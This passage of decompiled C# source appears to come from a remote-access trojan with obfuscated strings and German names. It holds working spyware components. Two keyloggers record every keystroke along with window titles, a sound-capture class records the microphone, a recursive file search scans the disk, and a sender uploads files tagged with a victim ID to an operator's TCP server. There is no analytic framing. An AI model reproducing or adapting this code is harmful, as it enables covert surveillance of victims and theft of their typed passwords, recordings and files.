						Bitmap sourceImage = new Bitmap(text);
						byte[] array = Image2ByteArray((Image)(object)PicResizeByWidth((Image)(object)sourceImage, 200), ImageFormat.get_Jpeg());
						parameter.writer.Write(text);
						parameter.writer.Write(array.Length);
						parameter.writer.Write(array);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			parameter.writer.Close();
			parameter.reader.Close();
			parameter.tcp_c.Close();
			parameter.socketstream.Close();
		}

		public void Stopp()
		{
			try
			{
				IsStreaming = false;
				t1.Abort();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public class SoundCapture
	{
		[DebuggerNonUserCode]
		public SoundCapture()
		{
		}

		[DllImport("winmm", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

		public void Start()
		{
			string lpstrCommand = GClass0.smethod_0("IŕɁ\u034dЂՏمݨ࠾\u0949\u0a65୫౿ഹ\u0e6f\u0f76\u1060ᅰት፦ᑶᕸᙿᜯᡏᥡ\u1a65᭪ᱹᴩṺὢ\u2065ⅶ≫⍶⑬╥");
			string lpstrReturnString = GClass0.smethod_0("");
			mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
			lpstrReturnString = GClass0.smethod_0("}ūɮ\u0363ѹծةݺࡢ॥੶୫\u0c76൬\u0e65");
			lpstrCommand = GClass0.smethod_0("");
			mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
		}

		public void Stopp()
		{
			string lpstrCommand = GClass0.smethod_0("kŶɠͰдաٷݲࡣॠ\u0a7b\u0b63౨ഫ\u0e49༳ၔᅥቪ፤ᑥᕢᙣᝠ");
			string lpstrReturnString = GClass0.smethod_0("");
			mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
			lpstrReturnString = GClass0.smethod_0("mšɣ\u0378ѯԩٺݢࡥॶ੫୶౬\u0d65");
			lpstrCommand = GClass0.smethod_0("");
			mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
		}
	}

	public class Keylogger
	{
		public delegate void NewOnlineKeyLoggsEventHandler(string sText);

		private NewOnlineKeyLoggsEventHandler NewOnlineKeyLoggsEvent;

		public string AktuellesFenster;

		private bool IsKeyloging;

		private int i;

		public event NewOnlineKeyLoggsEventHandler NewOnlineKeyLoggs
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				NewOnlineKeyLoggsEvent = (NewOnlineKeyLoggsEventHandler)Delegate.Combine(NewOnlineKeyLoggsEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				NewOnlineKeyLoggsEvent = (NewOnlineKeyLoggsEventHandler)Delegate.Remove(NewOnlineKeyLoggsEvent, value);
			}
		}

		public Keylogger()
		{
			IsKeyloging = false;
			i = 0;
		}

		public void Start()
		{
			IsKeyloging = true;
			i = 0;
			Thread thread = new Thread(keylogging);
			thread.IsBackground = true;
			thread.Start();
		}

		public void Stopp()
		{
			IsKeyloging = false;
			i = 0;
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern short GetAsyncKeyState(int vkey);

		public int getk()
		{
			int num = 1;
			do
			{
				if (GetAsyncKeyState(num) != -32767)
				{
					num = checked(num + 1);
					continue;
				}
				return num;
			}
			while (num <= 255);
			int result = default(int);
			return result;
		}

		private void keylogging()
		{
			int num = getk();
			string text = null;
			string text2 = null;
			while (IsKeyloging)
			{
				num = getk();
				if (num != 0 && num != 1)
				{
					if (Operators.CompareString(AktuellesFenster, text2, false) != 0)
					{
						text = text + GClass0.smethod_0("Fřɵ\u036eѼժيܫࠨऩਭଲఱരแཫၸᅩቸጪᑏᕭᙩ\u1775ᡱᥡ\u1a71\u1b38ᰡ") + AktuellesFenster + GClass0.smethod_0("\"Ś") + ((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime().ToString() + GClass0.smethod_0("UŜɃ\u036bѰզ\u0670ݜ");
						text2 = AktuellesFenster;
					}
					if (num == 222)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("å")) : (text + GClass0.smethod_0("Å")));
					}
					if (num == 189)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0(",")) : (text + GClass0.smethod_0("^")));
					}
					if (num == 187)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("*")) : (text + GClass0.smethod_0("+")));
					}
					if (num == 186)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("ý")) : (text + GClass0.smethod_0("Ý")));
					}
					if (num == 192)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("÷")) : (text + GClass0.smethod_0("×")));
					}
					if (num == 65)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("`")) : (text + GClass0.smethod_0("@")));
					}
					if (num == 66)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("c")) : (text + GClass0.smethod_0("C")));
					}
					if (num == 67)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("b")) : (text + GClass0.smethod_0("B")));
					}
					if (num == 68)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("e")) : (text + GClass0.smethod_0("E")));
					}
					if (num == 69)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("d")) : (text + GClass0.smethod_0("D")));
					}
					if (num == 70)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("g")) : (text + GClass0.smethod_0("G")));
					}
					if (num == 71)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("f")) : (text + GClass0.smethod_0("F")));
					}
					if (num == 72)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("i")) : (text + GClass0.smethod_0("I")));
					}
					if (num == 73)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("h")) : (text + GClass0.smethod_0("H")));
					}
					if (num == 74)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("k")) : (text + GClass0.smethod_0("K")));
					}
					if (num == 75)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("j")) : (text + GClass0.smethod_0("J")));
					}
					if (num == 76)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("m")) : (text + GClass0.smethod_0("M")));
					}
					if (num == 77)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("l")) : (text + GClass0.smethod_0("L")));
					}
					if (num == 78)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("o")) : (text + GClass0.smethod_0("O")));
					}
					if (num == 79)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("n")) : (text + GClass0.smethod_0("N")));
					}
					if (num == 80)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("q")) : (text + GClass0.smethod_0("Q")));
					}
					if (num == 81)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("p")) : (text + GClass0.smethod_0("P")));
					}
					if (num == 82)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("s")) : (text + GClass0.smethod_0("S")));
					}
					if (num == 83)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("r")) : (text + GClass0.smethod_0("R")));
					}
					if (num == 84)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("u")) : (text + GClass0.smethod_0("U")));
					}
					if (num == 85)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("t")) : (text + GClass0.smethod_0("T")));
					}
					if (num == 86)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("w")) : (text + GClass0.smethod_0("W")));
					}
					if (num == 87)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("v")) : (text + GClass0.smethod_0("V")));
					}
					if (num == 88)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("y")) : (text + GClass0.smethod_0("Y")));
					}
					if (num == 89)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("x")) : (text + GClass0.smethod_0("X")));
					}
					if (num == 90)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("{")) : (text + GClass0.smethod_0("[")));
					}
					if (num == 32)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("!")) : (text + GClass0.smethod_0("!")));
					}
					if (num == 13)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0(")œɂ\u0368ѱաٱݟ\u0821")) : (text + GClass0.smethod_0(")œɂ\u0368ѱաٱݟ\u0821")));
					}
					if (num == 219)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Þ")) : (text + GClass0.smethod_0(">")));
					}
					if (num == 49)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("0")) : (text + GClass0.smethod_0(" ")));
					}
					if (num == 50)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("3")) : (text + GClass0.smethod_0("#")));
					}
					if (num == 51)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("2")) : (text + GClass0.smethod_0("¦")));
					}
					if (num == 52)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("5")) : (text + GClass0.smethod_0("%")));
					}
					if (num == 53)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("4")) : (text + GClass0.smethod_0("$")));
					}
					if (num == 54)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("7")) : (text + GClass0.smethod_0("'")));
					}
					if (num == 55)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("6")) : (text + GClass0.smethod_0(".")));
					}
					if (num == 56)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("9")) : (text + GClass0.smethod_0(")")));
					}
					if (num == 57)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("8")) : (text + GClass0.smethod_0("(")));
					}
					if (num == 48)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("1")) : (text + GClass0.smethod_0("<")));
					}
					if (num == 191)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\"")) : (text + GClass0.smethod_0("&")));
					}
					if (num == 190)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("/")) : (text + GClass0.smethod_0(";")));
					}
					if (num == 188)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("-")) : (text + GClass0.smethod_0(":")));
					}
					if (num == 97)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("0")) : (text + GClass0.smethod_0("")));
					}
					if (num == 98)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("3")) : (text + GClass0.smethod_0("")));
					}
					if (num == 99)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("2")) : (text + GClass0.smethod_0("")));
					}
					if (num == 100)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("5")) : (text + GClass0.smethod_0("")));
					}
					if (num == 101)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("4")) : (text + GClass0.smethod_0("")));
					}
					if (num == 102)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("7")) : (text + GClass0.smethod_0("")));
					}
					if (num == 103)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("6")) : (text + GClass0.smethod_0("")));
					}
					if (num == 104)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("9")) : (text + GClass0.smethod_0("")));
					}
					if (num == 105)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("8")) : (text + GClass0.smethod_0("")));
					}
					if (num == 9)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^Őɢ\u0360ќ")) : (text + GClass0.smethod_0("^Őɢ\u0360ќ")));
					}
					if (num == 8)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Pňɨ\u036bѬյٵݥࡠ१ੜ")) : (text + GClass0.smethod_0("Pňɨ\u036bѬյٵݥࡠ१ੜ")));
					}
					if (num == 220)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("±")) : (text + GClass0.smethod_0("_")));
					}
					if (num == 40)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ\u0c73൫\u0e70ས\u106cᅜ")) : (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ\u0c73൫\u0e70ས\u106cᅜ")));
					}
					if (num == 37)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ౪൬\u0e6aཨ\u1071ᅜ")) : (text + GClass0.smethod_0("IŁɶ\u036aѧաٸݪ\u0879ॽ੭ଧ౪൬\u0e6aཨ\u1071ᅜ")));
					}
					if (num == 39)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Hłɷ\u0375Ѧբٹݭ\u0878ॾ੬ନ\u0c75\u0d63\u0e66ཬၷᅱቜ")) : (text + GClass0.smethod_0("Hłɷ\u0375Ѧբٹݭ\u0878ॾ੬ନ\u0c75\u0d63\u0e66ཬၷᅱቜ")));
					}
					if (num == 38)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Jŀɩ\u036bѤՠٿݫ\u087aॼ\u0a62ଦ౪൦\u0e66ཬၜ")) : (text + GClass0.smethod_0("Jŀɩ\u036bѤՠٿݫ\u087aॼ\u0a62ଦ౪൦\u0e66ཬၜ")));
					}
					if (num == 27)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^Łɐ\u0341ќ")) : (text + GClass0.smethod_0("^Łɐ\u0341ќ")));
					}
					if (num == 112)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȳ\u035c")) : (text + GClass0.smethod_0("_Ņȳ\u035c")));
					}
					if (num == 113)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_ŅȰ\u035c")) : (text + GClass0.smethod_0("_ŅȰ\u035c")));
					}
					if (num == 114)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȱ\u035c")) : (text + GClass0.smethod_0("_Ņȱ\u035c")));
					}
					if (num == 115)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȶ\u035c")) : (text + GClass0.smethod_0("_Ņȶ\u035c")));
					}
					if (num == 116)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȷ\u035c")) : (text + GClass0.smethod_0("_Ņȷ\u035c")));
					}
					if (num == 117)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȴ\u035c")) : (text + GClass0.smethod_0("_Ņȴ\u035c")));
					}
					if (num == 118)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_Ņȵ\u035c")) : (text + GClass0.smethod_0("_Ņȵ\u035c")));
					}
					if (num == 119)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_ŅȺ\u035c")) : (text + GClass0.smethod_0("_ŅȺ\u035c")));
					}
					if (num == 129)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("_ŅȻ\u035c")) : (text + GClass0.smethod_0("_ŅȻ\u035c")));
					}
					if (num == 121)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^łȲ\u0332ќ")) : (text + GClass0.smethod_0("^łȲ\u0332ќ")));
					}
					if (num == 122)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^łȲ\u0333ќ")) : (text + GClass0.smethod_0("^łȲ\u0333ќ")));
					}
					if (num == 123)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^łȲ\u0330ќ")) : (text + GClass0.smethod_0("^łȲ\u0330ќ")));
					}
					if (num == 164)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^ŅɯͶќ")) : (text + GClass0.smethod_0("^ŅɯͶќ")));
					}
					if (num == 17)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\\ŇɩͰфհ\u065c")) : (text + GClass0.smethod_0("\\ŇɩͰфհ\u065c")));
					}
					if (num == 91)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")) : (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")));
					}
					if (num == 144)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("^Ŋɶ\u036fќ")) : (text + GClass0.smethod_0("^Ŋɶ\u036fќ")));
					}
					if (num == 44)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\\łɷͱѠթ\u065c")) : (text + GClass0.smethod_0("\\łɷͱѠթ\u065c")));
					}
					if (num == 45)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("\\Ńɬ\u036aѥե\u065c")) : (text + GClass0.smethod_0("\\Ńɬ\u036aѥե\u065c")));
					}
					if (num == 145)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("]ŗɫ\u036fѮ՜")) : (text + GClass0.smethod_0("]ŗɫ\u036fѮ՜")));
					}
					if (num == 46)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("]ŀɪͷѤ՜")) : (text + GClass0.smethod_0("]ŀɪͷѤ՜")));
					}
					if (num == 146)
					{
						if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown())
						{
							text += GClass0.smethod_0("\\ŖɤͱѰէ\u065c");
						}
						else
						{
							if (num == 91)
							{
								text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")) : (text + GClass0.smethod_0("Třɤ\u0362ѯեپݻ\u0827\u0952\u0a64୷౷൧\u0e5c")));
							}
							text += GClass0.smethod_0("\\ŖɤͱѰէ\u065c");
						}
					}
					checked
					{
						i++;
						if (i >= 5)
						{
							NewOnlineKeyLoggsEvent?.Invoke(text);
							text = null;
							i = 0;
						}
					}
				}
				Thread.Sleep(1);
			}
		}
	}

	public class DateiSuche
	{
		public delegate void DateiGefundenEventHandler(string Pfad, string DateiName, string string_0, string suchwort);

		private struct Parameter
		{
			public string Datei;

			public string Ordner;
		}

		private bool Sollsuchen;

		private DateiGefundenEventHandler DateiGefundenEvent;

		public event DateiGefundenEventHandler DateiGefunden
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				DateiGefundenEvent = (DateiGefundenEventHandler)Delegate.Combine(DateiGefundenEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				DateiGefundenEvent = (DateiGefundenEventHandler)Delegate.Remove(DateiGefundenEvent, value);
			}
		}

		public DateiSuche()
		{
			Sollsuchen = false;
		}

		public void Start(string sSuchwort, string sStartordner)
		{
			Sollsuchen = true;
			Parameter parameter = default(Parameter);
			parameter.Datei = sSuchwort;
			parameter.Ordner = sStartordner;
			Thread thread = new Thread(delegate(object a0)
			{
				Parameter parameter2 = default(Parameter);
				Suchen((a0 != null) ? ((Parameter)a0) : parameter2);
			});
			thread.IsBackground = true;
			thread.Start(parameter);
		}

		public void Stopp()
		{
			Sollsuchen = false;
		}

		private void Suchen(Parameter p)
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(p.Ordner))
			{
				try
				{
					if (!Sollsuchen)
					{
						return;
					}
					if (file.ToString().Contains(p.Datei) && Operators.CompareString(file, GClass0.smethod_0(""), false) != 0)
					{
						FileInfo fileInfo = new FileInfo(file);
						DateiGefundenEvent?.Invoke(fileInfo.FullName, fileInfo.get_Name(), fileInfo.Length.ToString(), p.Datei);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			Parameter p2 = default(Parameter);
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(p.Ordner))
			{
				try
				{
					if (!Sollsuchen)
					{
						break;
					}
					p2.Datei = p.Datei;
					p2.Ordner = directory;
					Suchen(p2);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	public struct MsgBoxDetaills
	{
		public string Text;

		public string Titel;

		public string Style;
	}

	public class Logsender
	{
		public struct clienterverParameter
		{
			public string IpAdresse;

			public int Port;

			public TcpClient tcp_c;

			public NetworkStream socketstream;

			public BinaryWriter writer;

			public BinaryReader reader;

			public Thread tthread;
		}

		private Thread t1;

		private TcpClient Tcp_Client;

		public string VonHier;

		public string NachHier;

		[DebuggerNonUserCode]
		public Logsender()
		{
		}

		public void Start()
		{
			Tcp_Client = new TcpClient();
			Tcp_Client.Connect(Module2._Ipadresse, Module2._TransferPort);
			clienterverParameter clienterverParameter = default(clienterverParameter);
			clienterverParameter.reader = new BinaryReader(Tcp_Client.GetStream());
			clienterverParameter.writer = new BinaryWriter(Tcp_Client.GetStream());
			clienterverParameter.tcp_c = Tcp_Client;
			clienterverParameter.socketstream = Tcp_Client.GetStream();
			t1 = new Thread(delegate(object a0)
			{
				clienterverParameter clienterverParameter2 = default(clienterverParameter);
				SendFileToServer((a0 != null) ? ((clienterverParameter)a0) : clienterverParameter2);
			});
			t1.IsBackground = true;
			t1.Start(clienterverParameter);
		}

		private void SendFileToServer(clienterverParameter parameter)
		{
			FileStream fileStream = new FileStream(VonHier, FileMode.Open);
			byte[] array = new byte[checked((int)(fileStream.Length - 1L) + 1)];
			fileStream.Read(array, 0, array.Length);
			fileStream.Close();
			parameter.writer.Write(GClass0.smethod_0("DŬɯ\u0364Ѯը٠\u0748\u086c॥ੲ"));
			parameter.writer.Write(Module2.VictimID);
			parameter.writer.Write(array.Length);
			parameter.writer.Write(array);
			parameter.writer.Close();
			parameter.reader.Close();
			parameter.tcp_c.Close();
			parameter.socketstream.Close();
		}
	}

	public class OfflineKeylogger
	{
		public delegate void NewOnlineKeyLoggsEventHandler(string sText);

		private NewOnlineKeyLoggsEventHandler NewOnlineKeyLoggsEvent;

		public string AktuellesFenster;

		private bool IsKeyloging;

		private int i;

		public event NewOnlineKeyLoggsEventHandler NewOnlineKeyLoggs
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				NewOnlineKeyLoggsEvent = (NewOnlineKeyLoggsEventHandler)Delegate.Combine(NewOnlineKeyLoggsEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				NewOnlineKeyLoggsEvent = (NewOnlineKeyLoggsEventHandler)Delegate.Remove(NewOnlineKeyLoggsEvent, value);
			}
		}

		public OfflineKeylogger()
		{
			IsKeyloging = false;
			i = 0;
		}

		public void Start()
		{
			IsKeyloging = true;
			i = 0;
			Thread thread = new Thread(keylogging);
			thread.IsBackground = true;
			thread.Start();
		}

		public void Stopp()
		{
			IsKeyloging = false;
			i = 0;
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern short GetAsyncKeyState(int vkey);

		public int getk()
		{
			int num = 1;
			do
			{
				if (GetAsyncKeyState(num) != -32767)
				{
					num = checked(num + 1);
					continue;
				}
				return num;
			}
			while (num <= 255);
			int result = default(int);
			return result;
		}

		private void keylogging()
		{
			int num = getk();
			string text = null;
			string text2 = null;
			while (IsKeyloging)
			{
				num = getk();
				if (num != 0 && num != 1)
				{
					if (Operators.CompareString(AktuellesFenster, text2, false) != 0)
					{
						text = text + GClass0.smethod_0("Fřɵ\u036eѼժيܫࠨऩਭଲఱരแཫၸᅩቸጪᑏᕭᙩ\u1775ᡱᥡ\u1a71\u1b38ᰡ") + AktuellesFenster + GClass0.smethod_0("\"Ś") + ((ServerComputer)MyProject.Computer).get_Clock().get_LocalTime().ToString() + GClass0.smethod_0("UŜɃ\u036bѰզ\u0670ݜ");
						text2 = AktuellesFenster;
					}
					if (num == 222)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("å")) : (text + GClass0.smethod_0("Å")));
					}
					if (num == 189)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0(",")) : (text + GClass0.smethod_0("^")));
					}
					if (num == 187)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("*")) : (text + GClass0.smethod_0("+")));
					}
					if (num == 186)
					{
						text = ((!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown()) ? (text + GClass0.smethod_0("ý")) : (text + GClass0.smethod_0("Ý")));
					}
